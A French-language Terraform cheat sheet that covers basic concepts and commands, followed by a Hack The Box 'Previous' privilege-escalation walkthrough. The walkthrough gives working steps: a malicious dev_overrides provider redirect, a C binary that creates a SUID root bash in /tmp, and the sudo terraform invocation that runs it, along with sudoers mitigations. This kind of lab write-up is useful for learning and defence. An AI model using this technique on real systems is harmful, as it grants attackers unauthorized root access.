# Terraform

## <mark style="color:red;">Terraform</mark>

### <mark style="color:blue;">📘 Partie 1 : Comprendre Terraform</mark>

#### <mark style="color:green;">Qu'est-ce que Terraform ?</mark>

**Terraform** est un outil open-source d'Infrastructure as Code (IaC) développé par HashiCorp. Il permet de définir, provisionner et gérer l'infrastructure cloud et on-premise via des fichiers de configuration déclaratifs.

#### <mark style="color:green;">Concepts Clés</mark>

**1. Providers**

Les providers sont des plugins qui permettent à Terraform d'interagir avec des API externes (AWS, Azure, Google Cloud, etc.).

```hcl
provider "aws" {
  region = "us-west-2"
}
```

**2. Resources**

Les resources représentent les composants d'infrastructure (serveurs, réseaux, bases de données).

```hcl
resource "aws_instance" "example" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"
}
```

**3. Variables**

Permettent de paramétrer vos configurations.

```hcl
variable "instance_type" {
  type    = string
  default = "t2.micro"
}
```

***

### <mark style="color:blue;">🛠️ Commandes Importantes</mark>

#### <mark style="color:green;">Commandes de Base</mark>

| Commande             | Description                                                     |
| -------------------- | --------------------------------------------------------------- |
| `terraform init`     | Initialise le répertoire de travail et télécharge les providers |
| `terraform plan`     | Affiche un aperçu des changements à appliquer                   |
| `terraform apply`    | Applique les changements d'infrastructure                       |
| `terraform destroy`  | Détruit toute l'infrastructure gérée                            |
| `terraform validate` | Vérifie la syntaxe des fichiers de configuration                |
| `terraform fmt`      | Formate les fichiers de configuration                           |
| `terraform show`     | Affiche l'état actuel de l'infrastructure                       |

#### <mark style="color:green;">Commandes Avancées</mark>

```bash
# Initialiser avec un backend spécifique
terraform init -backend-config="path=terraform.tfstate"

# Appliquer avec auto-approve (dangereux en production!)
terraform apply -auto-approve

# Changer de répertoire de travail
terraform -chdir=/chemin/vers/config apply

# Cibler une ressource spécifique
terraform apply -target=aws_instance.example

# Voir l'état en détail
terraform state list
terraform state show aws_instance.example
```

***

### <mark style="color:blue;">📂 Structure des Fichiers</mark>

#### <mark style="color:green;">Fichiers Principaux</mark>

* **`main.tf`** : Configuration principale
* **`variables.tf`** : Définitions des variables
* **`outputs.tf`** : Valeurs de sortie
* **`terraform.tfstate`** : État de l'infrastructure (fichier critique)
* **`.terraformrc`** : Configuration utilisateur de Terraform
* **`.terraform/`** : Répertoire des plugins et providers

#### <mark style="color:green;">Exemple de Configuration</mark>

```hcl
# main.tf
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 4.0"
    }
  }
}

provider "aws" {
  region = var.aws_region
}

resource "aws_instance" "web" {
  ami           = var.ami_id
  instance_type = var.instance_type
  
  tags = {
    Name = "WebServer"
  }
}
```

***

### <mark style="color:red;">Escalade de Privilèges - Cas HTB "Previous"</mark>

#### <mark style="color:green;">🎯 Contexte de la Vulnérabilité</mark>

Dans le challenge HTB "Previous", l'utilisateur `jeremy` peut exécuter Terraform avec les privilèges root via sudo :

```bash
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

#### <mark style="color:green;">🔍 Analyse de la Configuration</mark>

**Fichier `.terraformrc` (Configuration Terraform)**

```hcl
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/usr/local/go/bin"
  }
  direct {}
}
```

**Explication** :

* `dev_overrides` permet de spécifier un chemin personnalisé pour les providers
* Terraform cherchera le binaire du provider dans `/usr/local/go/bin`
* Normalement, les providers sont téléchargés depuis le registry officiel

**Fichier `main.tf` de la Machine**

```hcl
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type    = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition     = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}
```

***

#### <mark style="color:green;">💣 Exploitation : Étape par Étape</mark>

**Étape 1 : Modifier `.terraformrc`**

L'utilisateur `jeremy` peut modifier son propre fichier `.terraformrc` pour rediriger le chemin du provider vers `/tmp` (où il a les droits d'écriture) :

```bash
cat > ~/.terraformrc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp"
  }
  direct {}
}
EOF
```

**Pourquoi ça marche ?**

* Le fichier `.terraformrc` est lu dans le home de l'utilisateur qui exécute la commande
* Même avec `sudo`, Terraform lit la configuration de l'utilisateur original

**Étape 2 : Créer un Faux Provider Malveillant**

Créer un programme C qui sera exécuté en tant que "provider" :

```c
// pwn.c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);   // Définir l'UID effectif à 0 (root)
    setgid(0);   // Définir le GID effectif à 0 (root)
    system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash");
    return 0;
}
```

**Ce que fait ce code** :

1. Élève les privilèges à root (car exécuté via sudo)
2. Copie `/bin/bash` vers `/tmp/bash`
3. Applique le bit SUID sur `/tmp/bash`

**Étape 3 : Compiler et Nommer le Binaire**

```bash
gcc pwn.c -o /tmp/terraform-provider-examples
chmod +x /tmp/terraform-provider-examples
```

**Important** : Le nom doit être `terraform-provider-examples` car Terraform cherche un binaire nommé `terraform-provider-<NOM>` où `<NOM>` correspond au provider déclaré.

**Étape 4 : Exécuter Terraform avec Sudo**

```bash
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

**Ce qui se passe** :

1. Terraform s'exécute en tant que root via sudo
2. Il lit le `.terraformrc` de jeremy
3. Il cherche le provider dans `/tmp/`
4. Il trouve et exécute `/tmp/terraform-provider-examples`
5. Le code malveillant s'exécute avec les privilèges root
6. Un bash SUID est créé dans `/tmp/`

**Étape 5 : Obtenir un Shell Root**

```bash
/tmp/bash -p
```

Le flag `-p` (privileged mode) empêche bash de réinitialiser l'UID effectif.

***

#### <mark style="color:green;">🔐 Pourquoi Cette Vulnérabilité Existe ?</mark>

**1. Mauvaise Configuration Sudo**

```bash
(root) /usr/bin/terraform -chdir=/opt/examples apply
```

* Pas de `env_reset` : Les variables d'environnement de l'utilisateur sont préservées
* Pas de restriction sur le fichier `.terraformrc`

**2. Mécanisme de dev\_overrides**

Le mécanisme `dev_overrides` est conçu pour le développement de providers personnalisés, mais il devient dangereux quand :

* Un utilisateur non privilégié peut modifier sa config
* Il peut pointer vers un répertoire où il a les droits d'écriture
* La commande s'exécute avec des privilèges élevés

**3. Chemin Contrôlé par l'Utilisateur**

L'utilisateur contrôle :

* Le contenu de `~/.terraformrc`
* Le contenu de `/tmp/`
* Le nom du binaire exécuté

***

#### <mark style="color:green;">🛡️ Protections et Mitigations</mark>

**Pour les Administrateurs Système**

```bash
# Option 1 : Utiliser env_reset dans sudoers
Defaults env_reset

# Option 2 : Spécifier les variables d'environnement autorisées
Defaults env_keep = "LANG LC_*"

# Option 3 : Désactiver la lecture de .terraformrc
sudo env -u HOME /usr/bin/terraform -chdir=/opt/examples apply

# Option 4 : Utiliser une configuration Terraform système
sudo TF_CLI_CONFIG_FILE=/etc/terraform/config.tfrc terraform apply
```

**Configuration Sécurisée de Sudoers**

```bash
# Mauvais (vulnérable)
jeremy ALL=(root) /usr/bin/terraform -chdir=/opt/examples apply

# Meilleur (mais toujours risqué)
Defaults:jeremy env_reset
jeremy ALL=(root) NOPASSWD: /usr/bin/terraform -chdir=/opt/examples apply

# Idéal
jeremy ALL=(root) NOPASSWD: /usr/local/bin/terraform-wrapper.sh
```

Avec un wrapper script :

```bash
#!/bin/bash
# /usr/local/bin/terraform-wrapper.sh
export HOME=/root
export TF_CLI_CONFIG_FILE=/etc/terraform/config.tfrc
cd /opt/examples
/usr/bin/terraform apply -auto-approve
```

***

### <mark style="color:blue;">📚 Résumé de l'Attaque</mark>

```
┌─────────────────────────────────────────────────────┐
│  1. Utilisateur modifie ~/.terraformrc              │
│     → Redirige provider vers /tmp                   │
└───────────────────┬─────────────────────────────────┘
                    │
┌───────────────────▼─────────────────────────────────┐
│  2. Crée un binaire malveillant dans /tmp          │
│     → terraform-provider-examples                   │
└───────────────────┬─────────────────────────────────┘
                    │
┌───────────────────▼─────────────────────────────────┐
│  3. Exécute : sudo terraform apply                 │
│     → Terraform lit ~/.terraformrc de l'utilisateur │
└───────────────────┬─────────────────────────────────┘
                    │
┌───────────────────▼─────────────────────────────────┐
│  4. Terraform exécute le faux provider             │
│     → Avec les privilèges root                      │
└───────────────────┬─────────────────────────────────┘
                    │
┌───────────────────▼─────────────────────────────────┐
│  5. Création d'un bash SUID                        │
│     → /tmp/bash avec bit SUID root                  │
└───────────────────┬─────────────────────────────────┘
                    │
┌───────────────────▼─────────────────────────────────┐
│  6. Shell root obtenu !                            │
│     → /tmp/bash -p                                  │
└─────────────────────────────────────────────────────┘
```

***
